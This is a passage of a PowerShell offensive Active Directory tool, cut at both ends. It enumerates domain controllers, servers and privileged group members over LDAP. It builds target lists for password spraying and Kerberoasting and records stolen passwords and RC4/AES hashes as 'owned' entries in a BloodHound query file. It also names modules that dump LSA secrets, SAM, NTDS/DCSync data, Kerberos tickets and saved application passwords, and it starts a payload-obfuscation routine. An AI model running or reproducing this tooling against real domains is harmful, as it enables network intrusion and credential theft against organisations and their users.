        $Global:TargetsWorkstations = $Global:TargetsAll | Where-Object {
            $_.Properties["operatingSystem"][0] -notlike "*windows*server*"
        } | Select-Object -Unique *

        $Global:TargetsServers = $Global:TargetsAll | Where-Object {
            $_.Properties["operatingSystem"][0] -like "*windows*server*" -and
            $_.Properties["operatingSystem"][0] -notlike "*domain controller*"
        } | Select-Object -Unique *

        # We need to modify the filter a little to identify Domain Controllers:
        $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $domainControllers = $searcher.FindAll() | Where-Object {
            $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
        }

        $Global:TargetsDomainControllers = $domainControllers | Select-Object -Unique *

        Write-Log "LDAP query complete and results cached." -Function Gather-LDAPComputers
    }


    function Process-LDAPQuery {
        param (
            [string]$Targets
        )

        Write-Log -Message "Initializing Process-LDAPQuery" -Function Process-LDAPQuery
        [array]$Computers = @()

        # Check if the required global variables are null or not defined
        if (-not $Global:TargetsAll) {
            Write-Log "Global variables not populated, running Gather-LDAPComputers." -Function Process-LDAPQuery
            Gather-LDAPComputers
        }

        if ($Targets -match "^\*.*|.*\*$") {
            Write-Log "Obtaining wildcard computers (Enabled) from cached data." -Function Process-LDAPQuery
            $wildcardFilter = $Targets -replace "\*", "*"
            [array]$Computers = $Global:TargetsAll | Where-Object {
                $_.Properties["dnshostname"][0] -like $wildcardFilter
            } | Select-Object -Unique *
        }
        elseif ($Targets -eq "Workstations") {
            Write-Log "Using cached Workstations data." -Function Process-LDAPQuery
            [array]$Computers = $Global:TargetsWorkstations | Select-Object *
        }
        elseif ($Targets -eq "Servers") {
            Write-Log "Using cached Servers data." -Function Process-LDAPQuery
            [array]$Computers = $Global:TargetsServers | Select-Object *
        }
        elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
            Write-Log "Using cached Domain Controllers data." -Function Process-LDAPQuery
            [array]$Computers = $Global:TargetsDomainControllers | Select-Object *
        }
        elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
            Write-Log "Using cached All systems data." -Function Process-LDAPQuery
            [array]$Computers = $Global:TargetsAll | Select-Object *
        }
        elseif (Test-Path $Targets) {
            Write-Log "Processing targets from file: $Targets" -Function Process-LDAPQuery
            $fileContent = Get-Content -Path $Targets
            foreach ($line in $fileContent) {
                $names = $line -split ',' | ForEach-Object { $_.Trim() }
                foreach ($name in $names) {
                    if ([string]::IsNullOrWhiteSpace($name)) { continue }

                    # Attempt to resolve by FQDN
                    $resolvedName = $name
                    if ($name -notlike "*.*") { $resolvedName += ".$Domain" }

                    # First, try to find an exact FQDN match
                    $computer = $Global:TargetsAll | Where-Object { $_.Properties["dnshostname"][0] -ieq $resolvedName }

                    # If no FQDN match, try to match by hostname only
                    if (-not $computer) {
                        $computer = $Global:TargetsAll | Where-Object { $_.Properties["dnshostname"][0].Split('.')[0] -ieq $name }
                    }

                    if ($computer) {
                        [array]$Computers += $computer
                    }
                    else {
                        Write-Warning "[Process-LDAPQuery] No LDAP entry found for $resolvedName or $name"
                    }
                }
            }
        }
        else {
            Write-Log "Processing specific target: $Targets" -Function Process-LDAPQuery
            $resolvedName = $Targets
            if ($Targets -notlike "*.*") { $resolvedName += ".$Domain" }
            [array]$Computers = $Global:TargetsAll | Where-Object {
                $_.Properties["dnshostname"][0] -eq $resolvedName
            } | Select-Object -Unique *

            if (-not [array]$Computers) {
                Write-Warning "[Process-LDAPQuery] No LDAP entry found for the computer: $resolvedName"
            }
        }

        # Ensure we only return unique entries
        [array]$computers = [array]$computers | Select-Object -Unique *

        $Global:ComputerCount = [array]$Computers.Count
        Write-Log "Total number of objects returned: $Global:ComputerCount" -Function Process-LDAPQuery

        return [array]$computers
    }



    if (-not $IPAddress) {
        if ($Method -in $ComputerTargetMethods) {
            [array]$Computers = Process-LDAPQuery -Targets $Targets
        }
    }




    ################################################################################################################
    ############################ Grab interesting users for various parsing functions ##############################
    ################################################################################################################

    function Get-GroupMembers {
        param ([string]$GroupName)
    
        $searcher = New-Searcher
        $searcher.PropertiesToLoad.AddRange(@("member"))
        $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
        $group = $searcher.FindOne()
        $members = @()

        if ($group -ne $null -and $group.Properties["member"]) {
            foreach ($memberDN in $group.Properties["member"]) {
                $searcher.Filter = "(distinguishedName=$memberDN)"
                $searcher.PropertiesToLoad.Clear()
                $searcher.PropertiesToLoad.AddRange(@("samAccountName", "objectClass"))
                $object = $searcher.FindOne()

                if ($object -and $object.Properties["objectClass"] -contains "user") {
                    $samName = $object.Properties["samAccountName"]
                    if ($samName -and $samName.Count -gt 0) {
                        $members += $samName[0].ToString()
                    }
                }
            }
        }

        return $members
    }

    if ($Module -eq "LogonPasswords" -or $Module -eq "eKeys" -or $Module -eq "TGTDeleg" -or ($Module -eq "KerbDump" -and !$NoParse)) {
        $FQDNDomainName = $domain.ToLower()

        # Domain Admins
        if ($null -eq $Global:DomainAdmins -and $Global:DomainAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Domain Admins group"
            $Global:DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
            $Global:DomainAdminsChecked = "1"
            if ($Global:DomainAdmins.Count -eq 0) { 
                $Global:DomainAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusDomainAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusDomainAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Enterprise Admins
        if ($null -eq $Global:EnterpriseAdmins -and $Global:EnterpriseAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Enterprise Admins group"
            $Global:EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
            $Global:EnterpriseAdminsChecked = "1"
            if ($Global:EnterpriseAdmins.Count -eq 0) { 
                $Global:EnterpriseAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusEnterpriseAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusEnterpriseAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Server Operators
        if ($null -eq $Global:ServerOperators -and $Global:ServerOperatorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Server Operators group"
            $Global:ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
            $Global:ServerOperatorsChecked = "1"
            if ($Global:ServerOperators.Count -eq 0) { 
                $Global:ServerOperators = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusServerOperators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusServerOperators) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Account Operators
        if ($null -eq $Global:AccountOperators -and $Global:AccountOperatorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Account Operators group"
            $Global:AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue
            $Global:AccountOperatorsChecked = "1"
            if ($Global:AccountOperators.Count -eq 0) { 
                $Global:AccountOperators = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusAccountOperators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusAccountOperators) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Hyper-V Administrators
        if ($null -eq $Global:HyperVAdministrators -and $Global:HyperVAdministratorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Hyper-V Administrators group"
            $Global:HyperVAdministrators = Get-GroupMembers -GroupName "Hyper-V Administrators" -ErrorAction SilentlyContinue
            $Global:HyperVAdministratorsChecked = "1"
            if ($Global:HyperVAdministrators.Count -eq 0) { 
                $Global:HyperVAdministrators = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusHyperVAdministrators = $HyperVAdministrators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusHyperVAdministrators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusHyperVAdministrators) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Storage Replicate Administrators
        if ($null -eq $Global:StorageReplicateAdministrators -and $Global:StorageReplicateAdministratorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Storage Replicate Administrators group"
            $Global:StorageReplicateAdministrators = Get-GroupMembers -GroupName "Storage Replicate Administrators" -ErrorAction SilentlyContinue
            $Global:StorageReplicateAdministratorsChecked = "1"
            if ($Global:StorageReplicateAdministrators.Count -eq 0) { 
                $Global:StorageReplicateAdministrators = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusStorageReplicateAdministrators = $StorageReplicateAdministrators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusStorageReplicateAdministrators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusStorageReplicateAdministrators) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Schema Admins
        if ($null -eq $Global:SchemaAdmins -and $Global:SchemaAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Schema Admins group"
            $Global:SchemaAdmins = Get-GroupMembers -GroupName "Schema Admins" -ErrorAction SilentlyContinue
            $Global:SchemaAdminsChecked = "1"
            if ($Global:SchemaAdmins.Count -eq 0) { 
                $Global:SchemaAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusSchemaAdmins = $SchemaAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusSchemaAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusSchemaAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Key Admins
        if ($null -eq $Global:KeyAdmins -and $Global:KeyAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Key Admins group"
            $Global:KeyAdmins = Get-GroupMembers -GroupName "Key Admins" -ErrorAction SilentlyContinue
            $Global:KeyAdminsChecked = "1"
            if ($Global:KeyAdmins.Count -eq 0) { 
                $Global:KeyAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusKeyAdmins = $KeyAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusKeyAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusKeyAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Enterprise Key Admins
        if ($null -eq $Global:EnterpriseKeyAdmins -and $Global:EnterpriseKeyAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Enterprise Key Admins group"
            $Global:EnterpriseKeyAdmins = Get-GroupMembers -GroupName "Enterprise Key Admins" -ErrorAction SilentlyContinue
            $Global:EnterpriseKeyAdminsChecked = "1"
            if ($Global:EnterpriseKeyAdmins.Count -eq 0) { 
                $Global:EnterpriseKeyAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusEnterpriseKeyAdmins = $EnterpriseKeyAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusEnterpriseKeyAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusEnterpriseKeyAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # DnsAdmins
        if ($null -eq $Global:DnsAdmins -and $Global:DnsAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the DnsAdmins group"
            $Global:DnsAdmins = Get-GroupMembers -GroupName "DnsAdmins" -ErrorAction SilentlyContinue
            $Global:DnsAdminsChecked = "1"
            if ($Global:DnsAdmins.Count -eq 0) { $Global:DnsAdmins = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusDnsAdmins = $DnsAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusDnsAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusDnsAdmins) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # DHCP Administrators
        if ($null -eq $Global:DHCPAdministrators -and $Global:DHCPAdministratorsChecked -ne "1") {
            Write-Log -Message "Getting members from the DHCP Administrators group"
            $Global:DHCPAdministrators = Get-GroupMembers -GroupName "DHCP Administrators" -ErrorAction SilentlyContinue
            $Global:DHCPAdministratorsChecked = "1"
            if ($Global:DHCPAdministrators.Count -eq 0) { $Global:DHCPAdministrators = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusDHCPAdministrators = $DHCPAdministrators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusDHCPAdministrators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusDHCPAdministrators) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Group Policy Creator Owners
        if ($null -eq $Global:GroupPolicyCreatorOwners -and $Global:GroupPolicyCreatorOwnersChecked -ne "1") {
            Write-Log -Message "Getting members from the Group Policy Creator Owners group"
            $Global:GroupPolicyCreatorOwners = Get-GroupMembers -GroupName "Group Policy Creator Owners" -ErrorAction SilentlyContinue
            $Global:GroupPolicyCreatorOwnersChecked = "1"
            if ($Global:GroupPolicyCreatorOwners.Count -eq 0) { $Global:GroupPolicyCreatorOwners = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusGroupPolicyCreatorOwners = $GroupPolicyCreatorOwners | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusGroupPolicyCreatorOwners -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusGroupPolicyCreatorOwners) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Backup Operators
        if ($null -eq $Global:BackupOperators -and $Global:BackupOperatorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Backup Operators group"
            $Global:BackupOperators = Get-GroupMembers -GroupName "Backup Operators" -ErrorAction SilentlyContinue
            $Global:BackupOperatorsChecked = "1"
            if ($Global:BackupOperators.Count -eq 0) { $Global:BackupOperators = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusBackupOperators = $BackupOperators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusBackupOperators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusBackupOperators) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Cert Publishers
        if ($null -eq $Global:CertPublishers -and $Global:CertPublishersChecked -ne "1") {
            Write-Log -Message "Getting members from the Cert Publishers group"
            $Global:CertPublishers = Get-GroupMembers -GroupName "Cert Publishers" -ErrorAction SilentlyContinue
            $Global:CertPublishersChecked = "1"
            if ($Global:CertPublishers.Count -eq 0) { $Global:CertPublishers = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusCertPublishers = $CertPublishers | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusCertPublishers -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusCertPublishers) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Print Operators
        if ($null -eq $Global:PrintOperators -and $Global:PrintOperatorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Print Operators group"
            $Global:PrintOperators = Get-GroupMembers -GroupName "Print Operators" -ErrorAction SilentlyContinue
            $Global:PrintOperatorsChecked = "1"
            if ($Global:PrintOperators.Count -eq 0) { $Global:PrintOperators = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusPrintOperators = $PrintOperators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusPrintOperators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusPrintOperators) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Organization Management
        if ($null -eq $Global:OrganizationManagement -and $Global:OrganizationManagementChecked -ne "1") {
            Write-Log -Message "Getting members from the Organization Management group"
            $Global:OrganizationManagement = Get-GroupMembers -GroupName "Organization Management" -ErrorAction SilentlyContinue
            $Global:OrganizationManagementChecked = "1"
            if ($Global:OrganizationManagement.Count -eq 0) { $Global:OrganizationManagement = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusOrganizationManagement = $OrganizationManagement | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusOrganizationManagement -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusOrganizationManagement) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Server Management
        if ($null -eq $Global:ServerManagement -and $Global:ServerManagementChecked -ne "1") {
            Write-Log -Message "Getting members from the Server Management group"
            $Global:ServerManagement = Get-GroupMembers -GroupName "Server Management" -ErrorAction SilentlyContinue
            $Global:ServerManagementChecked = "1"
            if ($Global:ServerManagement.Count -eq 0) { $Global:ServerManagement = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusServerManagement = $ServerManagement | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusServerManagement -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusServerManagement) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }
    }



    if ($Method -eq "Spray") {
        Write-Log -Message  "Performing user LDAP queries for method (Spray)"
        $searcher = New-Searcher
        if ($Targets -eq "AdminCount=1") {
            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(adminCount=1)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        }
        else {
            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        }
        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

        if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users" -or $Targets -eq "AdminCount=1") {
            $Targets = $EnabledDomainUsers
        }
        elseif (Test-Path $Targets -PathType Leaf) {
            $EnabledDomainUsers = Get-Content -Path $Targets
        }
        elseif ($Targets -in $EnabledDomainUsers) {
            $EnabledDomainUsers = $Targets
        }
        else {
            $groupMembers = Get-GroupMembers -GroupName $Targets
            if ($groupMembers.Count -gt 0) {
                $EnabledDomainUsers = $groupMembers
            }
            elseif ($groupMembers.Count -eq 0) {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Group either does not exist or is empty"
                return
            }
            else {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Unspecified Error"
                return
            }
        }
    }

    if ($Method -eq "IPMI" -and $Option -eq "IPMI:DomainUsers") {
        Write-Log -Message  "Performing user LDAP queries for method (IPMI)"
        $searcher = New-Searcher
        $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] 

        }
    }

    if ($Method -eq "Kerberoast") {
    
        $searcher = New-Searcher

        if ($Option -like "Kerberoast:*") {
            $SplitUser = $Option.Split(':')[1]
         
            Write-Log -Message  "Performing single user LDAP query (Kerberoast)($SplitUser)"
            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$SplitUser)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(ServicePrincipalName=*))"
        }
        else {
        
            Write-Log -Message  "Performing user LDAP queries for method (Kerberoast)"
            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(ServicePrincipalName=*))"
        }

        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
    
        $RoastUsers = @($users | ForEach-Object { $_.Properties["samAccountName"][0] })

        if ($RoastUsers.Count -eq 0) {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "No candidate user objects found"
            return
        }
        else {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Found $($RoastUsers.Count) roastable Users"
            Write-Host
        }
    }

    # Grab Computer Accounts for spraying
    function Get-ComputerAccounts {
        Write-Log -Message  "Obtaining Computer Accounts (For Spraying) from LDAP"
        $searcher = New-Searcher
        $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
        try {
            $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
            return $ComputerSamAccounts
        }
        catch {
            Write-Error "Failed to fetch computer accounts. Error: $_"
            return $null
        }
    }
    
    $ComputerSamAccounts = Get-ComputerAccounts


    if (!$LocalAuth) { 
        if (!$CurrentUser) {
            if ($Method -ne "GenRelayList" -or $Method -ne "Kerberoasting" -or $Method -ne "Spray") {
                if ($Method -ne "Spray") {
                    try {
                        $searcher = New-Searcher
                        $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
                        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
                        $user = $searcher.FindOne()
                        $domainUser = $user.Properties["samAccountName"]
                    }
                    Catch {
           
                        if ($Ticket -ne $null) {} 
                        elseif (!$DomainUser) {
                            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                            Write-Host "Specified username is not a valid domain user"
                            return
                                           
                        }
                    }
                }
            }
        }
    }


    ################################################################################################################
    ################################################# Queries ######################################################
    ################################################################################################################


    function Append-BHQuery {
        param(
            [Parameter(Mandatory = $false)]
            [string]$UserName,

            [Parameter(Mandatory = $false)]
            [string]$Password,

            [Parameter(Mandatory = $false)]
            [string]$RC4,

            [Parameter(Mandatory = $false)]
            [string]$AES256,

            [Parameter(Mandatory = $false)]
            [string]$ComputerName,

            [Parameter(Mandatory = $false)]
            [switch]$UserOwned,

            [Parameter(Mandatory = $false)]
            [switch]$AESProperty,

            [Parameter(Mandatory = $false)]
            [switch]$AdminToProperty,

            [Parameter(Mandatory = $false)]
            [switch]$RC4Property,

            [Parameter(Mandatory = $false)]
            [switch]$PasswordProperty,

            [Parameter(Mandatory = $false)]
            [switch]$ComputerOwned,

            [Parameter(Mandatory = $false)]
            [string]$Domain
        )

        try {

            $filePath = "$BloodHound\Query.txt"
            $fileContent = Get-Content -Path $filePath -Raw

            if ($UserName -like "*$*") { return }
            if ($UserName -like "*\*") { return }


            if ($UserName -and $ComputerName -and $AdminToProperty) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $formattedComputerName = "$($ComputerName.ToUpper()).$($Domain.ToUpper())"
                $AdminToEntry = "{atname: ""$formattedUserName"", atcomputername: ""$formattedComputerName""}"
                if (-not $fileContent.Contains($AdminToEntry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(AdminToitem IN \[)(.*)(?=\] \|)", "`$1, $AdminToEntry"
                }
            }

            # sets RC4 property for user
            elseif ($UserName -and $RC4 -and $RC4Property) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $RC4Entry = "{rc4name: ""$formattedUserName"", RC4: ""$RC4""}"
                if (-not $fileContent.Contains($RC4Entry)) {
                    $userEntryRC4 = ", $RC4Entry"
                    $fileContent = $fileContent -replace "(?<=FOREACH \(RC4item IN \[)(.*)(?=\] \|)", "`$1$userEntryRC4"
                }
            }

            # sets AES property for user
            elseif ($UserName -and $AES256 -and $AESProperty) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $AES256Entry = "{aesname: ""$formattedUserName"", AES256: ""$AES256""}"
                if (-not $fileContent.Contains($AES256Entry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(AES256item IN \[)(.*)(?=\] \|)", "`$1, $AES256Entry"
                }
            }


            # Sets username and password property
            elseif ($UserName -and $Password -and $PasswordProperty) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $passwordEntry = "{pname: ""$formattedUserName"", ppassword: ""$Password""}"
                if (-not $fileContent.Contains($passwordEntry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(Passworditem IN \[)(.*)(?=\] \|)", "`$1, $passwordEntry"
                }
            }
            # sets user as owned
            elseif ($UserName -and $UserOwned) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $userEntry = "{uname: ""$formattedUserName""}"
                if (-not $fileContent.Contains($userEntry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(Useritem IN \[)(.*)(?=\] \|)", "`$1, $userEntry"
                }
            }

            # sets computer as owned
            elseif ($ComputerName -and $ComputerOwned) {
                if ($IPAddress) { return }
                $formattedComputerName = "$($ComputerName.ToUpper()).$($Domain.ToUpper())"
                $computerEntry = "{cname: ""$formattedComputerName""}"
                if (-not $fileContent.Contains($computerentry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(Computeritem IN \[)(.*)(?=\] \|)", "`$1, $computerEntry"
                }
            }

            Set-Content -Path $filePath -Value $fileContent

        }
        Catch {}
    }




    ################################################################################################################
    ################################## Information based on selected module ########################################
    ################################################################################################################

    if ($Method -eq "SessionHunter") {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Searching for systems where privileged users' credentials might be in running memory"
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Filtering by those for which we have admin rights"
        Write-Host
        Start-Sleep -Seconds 3
    }

    if ($Method -eq "DCSync") {
        
        if ($Option -like "dcsync:*") {
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "DCSync output will be written to $DCSyncUser"

        }

        else {

            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "DCSync output will be written to $DCSyncFullDump"

        }
   
        if (!$ShowOutput) {
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Use -ShowOutput to display results in the console"
            Write-Host ""
        }
    }

    # Construct the hash table
    $moduleMessages = @{
        "ConsoleHistory" = "Console History output will be written to $ConsoleHistory"
        "ekeys"          = "eKeys output will be written to $ekeys"
        "FileZilla"      = "FileZilla output will be written to $FileZilla"
        "Files"          = "File output will be written to $UserFiles"
        "KerbDump"       = "Tickets will be written to $Tickets"
        "LSA"            = "LSA output will be written to $LSADump"
        "LSA-Trust"      = "LSA-Trust output will be written to $LSATrust"
        "LogonPasswords" = "LogonPasswords output will be written to $LogonPasswords"
        "NotePad"        = " Notepad output will be written to $NotePad"
        "NTDS"           = "NTDS output will be written to $DCSyncDir"
        "NTLM"           = "NTLM output will be written to $NTLM"
        "SAM"            = "SAM output will be written to $SAM"
        "SCCM"           = "SCCM output will be written to $SCCM"
        "SessionExec"    = "SessionExec output will be written to $SessionExec"
        "Tickets"        = "Tickets will be written to $MimiTickets"
        "Timeroast"      = "Timeroast will be written to $Timeroast"
        "TGTDeleg"       = "TGTDeleg output will be written to $TGTDeleg"
        "VNC"            = "VNC Passwords output will be written to $VNCDump"
        "Wifi"           = "Wi-Fi output will be written to $Wifi"
        "WinSCP"         = "WinSCP output will be written to $WinSCP"
    }

    # Check if the module message exists and display it
    if ($moduleMessages.ContainsKey($Module)) {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host $moduleMessages[$Module]
    
        if (!$ShowOutput) {
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Use -ShowOutput to display results in the console"
            Write-Host ""
        }
    }
    elseif ($Method -eq "GenRelayList") {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "SMB Signing output will be written to $SMB"
    }
    ################################################################################################################
    ######################################## Command and Module logic ## ###########################################
    ################################################################################################################

    function Generate-RandomString {
        param(
            [int]$Length = 32
        )
        $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        $bytes = New-Object byte[] $Length
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $rng.GetBytes($bytes)
        $rng.Dispose()
        $string = ($bytes | ForEach-Object { $characters[$_ % $characters.Length] }) -join ''
        return $string
    }

    function obfuscation-arguments {

        if (-not ($Obfuscate)) { return $Command }

        $OldLength = $Command.Length

        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Obfuscating payload..."

        $Shuffle = @()
        if ($Obfuscate -like "*c*") { $Shuffle += 'c' }
        if ($Obfuscate -like "*g*") { $Shuffle += 'g' }
        if ($Obfuscate -like "*u*") { $Shuffle += 'u' }

        $ShuffledConditions = $Shuffle | Get-Random -Count $Shuffle.Count

        
        foreach ($Condition in $ShuffledConditions) {
            switch ($Condition) {
                'c' { $Command = Out-Compressed -StringInput $Command }            
                'g' { $Command = Out-Gzip -InputString $Command }
                'u' { $Command = Out-UUID -InputString $Command }
            }
        }

        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
